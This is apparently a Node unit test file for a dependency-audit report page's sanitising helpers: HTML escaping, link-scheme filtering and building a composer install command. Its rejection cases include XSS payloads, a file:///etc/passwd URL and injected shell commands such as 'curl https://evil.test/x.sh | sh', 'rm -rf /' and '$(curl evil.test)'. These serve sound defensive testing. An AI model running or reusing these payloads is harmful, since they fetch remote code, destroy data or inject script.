/**
 * The DOM-free half of the report page.
 *
 * Run with node's own test runner and nothing installed:
 *
 *     node --test tests/js
 *
 * Node is a development tool here and nowhere else: the page has no build step, the PHAR is built
 * without it, and what ships is the source in resources/report/. These tests exist because two of
 * the functions below are the boundary where a mistake stops being a rendering bug and becomes a
 * vulnerability — the page renders documents it did not produce.
 */

const test = require("node:test");
const assert = require("node:assert");
const lib = require("../../resources/report/lib.js");

test("esc closes every hole an attribute or a tag could give", () => {
    assert.strictEqual(lib.esc('<script>alert("x")</script>'), "&lt;script&gt;alert(&quot;x&quot;)&lt;/script&gt;");
    assert.strictEqual(lib.esc("a & b"), "a &amp; b");
    assert.strictEqual(lib.esc("already &amp; escaped"), "already &amp;amp; escaped", "the ampersand goes first");
    assert.strictEqual(lib.esc(null), "");
    assert.strictEqual(lib.esc(undefined), "");
    assert.strictEqual(lib.esc(0), "0", "a falsy number is not nothing");
});

test("esc leaves the apostrophe alone, which every caller has to hold to", () => {
    // Not an oversight: every attribute the page writes is delimited with a double quote. A caller
    // that ever delimits one with a single quote makes this a hole, so it is pinned here.
    assert.strictEqual(lib.esc("it's"), "it's");
});

test("safeHref passes the links a report really carries", () => {
    for (const url of [
        "https://github.com/vendor/pkg",
        "http://example.test/advisory?id=1",
        "https://nvd.nist.gov/vuln/detail/CVE-2022-31090",
        "HTTPS://EXAMPLE.TEST/x"
    ]) {
        assert.strictEqual(lib.safeHref(url), url, url);
    }
    assert.strictEqual(lib.safeHref("  https://example.test/x  "), "https://example.test/x", "trimmed");
});

test("safeHref refuses every scheme that could run or smuggle", () => {
    for (const url of [
        "javascript:alert(1)",
        "JavaScript:alert(1)",
        "  javascript:alert(1)",
        "data:text/html;base64,PHNjcmlwdD4=",
        "vbscript:msgbox",
        "file:///etc/passwd",
        "ssh://git@github.com/vendor/pkg.git",
        "//evil.test/x",
        "/relative/path",
        "mailto:someone@example.test"
    ]) {
        assert.strictEqual(lib.safeHref(url), null, url);
    }
});

test("safeHref refuses a url that would break out of the attribute it lands in", () => {
    assert.strictEqual(lib.safeHref('https://example.test/x" onmouseover="alert(1)'), null);
    assert.strictEqual(lib.safeHref("https://example.test/x'>"), null);
    assert.strictEqual(lib.safeHref("https://example.test/x<script>"), null);
    assert.strictEqual(lib.safeHref("https://example.test/a b"), null, "a space ends the url");
});

test("safeHref takes nothing but a string", () => {
    for (const value of [null, undefined, 42, {}, ["https://example.test/"], true]) {
        assert.strictEqual(lib.safeHref(value), null, String(value));
    }
});

test("installCommand builds the line a real finding suggests", () => {
    assert.strictEqual(lib.installCommand("predis/predis", "^3.6"), "composer require predis/predis ^3.6");
    assert.strictEqual(lib.installCommand("laravel/framework", ">=10.0 <12.0"), "composer require laravel/framework >=10.0 <12.0");
    assert.strictEqual(lib.installCommand("vendor/pkg", "~2.0|^3.0"), "composer require vendor/pkg ~2.0|^3.0");
    assert.strictEqual(lib.installCommand("vendor/pkg", "1.2.*@dev"), "composer require vendor/pkg 1.2.*@dev");
});

test("installCommand offers nothing when a second command is hiding in the constraint", () => {
    // What the button copies is this string, and after a clipboard there is no escaping left.
    for (const constraint of [
        "^7.0\ncurl https://evil.test/x.sh | sh",
        "^7.0; rm -rf /",
        "^7.0 && wget evil.test",
        "^7.0`id`",
        "^7.0$(id)",
        "^7.0 # ",
        "$(curl evil.test)",
        "^7.0\r\nid"
    ]) {
        assert.strictEqual(lib.installCommand("vendor/pkg", constraint), null, JSON.stringify(constraint));
    }
});

test("installCommand refuses a package name that is not a vendor and a name", () => {
    for (const name of [
        "vendor/pkg; id",
        "../../etc/passwd",
        "vendor/pkg extra",
        "novendor",
        "vendor/",
        "/pkg",
        "-vendor/pkg",
        "vendor/pkg\nid",
        ""
    ]) {
        assert.strictEqual(lib.installCommand(name, "^1.0"), null, JSON.stringify(name));
    }
});

test("installCommand caps how long a constraint may be", () => {
    assert.strictEqual(lib.installCommand("vendor/pkg", "^" + "1".repeat(98)), "composer require vendor/pkg ^" + "1".repeat(98));
    assert.strictEqual(lib.installCommand("vendor/pkg", "^" + "1".repeat(100)), null);
});

test("day keeps the date and drops the clock", () => {
    assert.strictEqual(lib.day("2026-09-21T06:39:08Z"), "2026-09-21");
    assert.strictEqual(lib.day("2026-09-21"), "2026-09-21");
    assert.strictEqual(lib.day(null), "—");
    assert.strictEqual(lib.day(""), "—");
});

test("ageText says months under a year and tenths of a year over it", () => {
    const now = new Date("2026-09-21T00:00:00Z");
    assert.strictEqual(lib.ageText("2026-06-21T00:00:00Z", now), "3 mo ago");
    assert.strictEqual(lib.ageText("2023-09-21T00:00:00Z", now), "3.0 y ago");
    assert.strictEqual(lib.ageText(null, now), "undated");
});

test("ageText never rounds a fresh release down to nothing", () => {
    // "0 mo ago" would read as a bug in the tool rather than as a release from last week.
    const now = new Date("2026-09-21T00:00:00Z");
    assert.strictEqual(lib.ageText("2026-09-20T00:00:00Z", now), "1 mo ago");
    assert.strictEqual(lib.ageText("2026-09-21T00:00:00Z", now), "1 mo ago");
});

test("plural counts one thing as one", () => {
    assert.strictEqual(lib.plural(1, "advisory", "advisories"), "1 advisory");
    assert.strictEqual(lib.plural(2, "advisory", "advisories"), "2 advisories");
    assert.strictEqual(lib.plural(0, "advisory", "advisories"), "0 advisories");
});

test("kvRows drops what is not known and keeps what is", () => {
    assert.strictEqual(
        lib.kvRows([["installed", "v1.0"], ["released", null], ["type", undefined], ["php", ""]]),
        "<dt>installed</dt><dd>v1.0</dd>"
    );
    assert.strictEqual(lib.kvRows([["a", null]]), "", "nothing known means no rows, so no section");
    assert.strictEqual(lib.kvRows([["count", "0"]]), "<dt>count</dt><dd>0</dd>", "a zero is a value");
});

test("kvRows escapes the label and trusts the value, which arrives escaped", () => {
    assert.strictEqual(
        lib.kvRows([['<b>"x"', '<a href="https://example.test/">link</a>']]),
        '<dt>&lt;b&gt;&quot;x&quot;</dt><dd><a href="https://example.test/">link</a></dd>'
    );
});

test("parseQuery reads a bare word as text and folds its case", () => {
    assert.deepStrictEqual(lib.parseQuery("Guzzle  HTTP").text, ["guzzle", "http"]);
    assert.deepStrictEqual(lib.parseQuery("").text, []);
    assert.deepStrictEqual(lib.parseQuery("   ").text, []);
    assert.deepStrictEqual(lib.parseQuery(null).text, []);
});

test("parseQuery widens on a repeated key, because two verdicts mean either", () => {
    const terms = lib.parseQuery("verdict:silent verdict:abandoned");
    assert.deepStrictEqual(terms.verdict, ["silent", "abandoned"]);
});

test("parseQuery upper-cases the two keys whose values are identifiers", () => {
    const terms = lib.parseQuery("signal:s9 cve:cve-2022-31090 severity:Critical");
    assert.deepStrictEqual(terms.signal, ["S9"]);
    assert.deepStrictEqual(terms.cve, ["CVE-2022-31090"]);
    assert.deepStrictEqual(terms.severity, ["critical"], "severity is a word, not an identifier");
});

test("parseQuery reads the two boolean keys, and only those", () => {
    assert.strictEqual(lib.parseQuery("direct:yes").direct, true);
    assert.strictEqual(lib.parseQuery("direct:true").direct, true);
    assert.strictEqual(lib.parseQuery("direct:1").direct, true);
    assert.strictEqual(lib.parseQuery("direct:no").direct, false);
    assert.strictEqual(lib.parseQuery("dev:anything-else").dev, false);
    assert.strictEqual(lib.parseQuery("guzzle").direct, null, "unasked is not the same as no");
});

test("parseQuery treats an unknown key as text, not as a filter nobody applies", () => {
    assert.deepStrictEqual(lib.parseQuery("license:mit").text, ["license:mit"]);
});
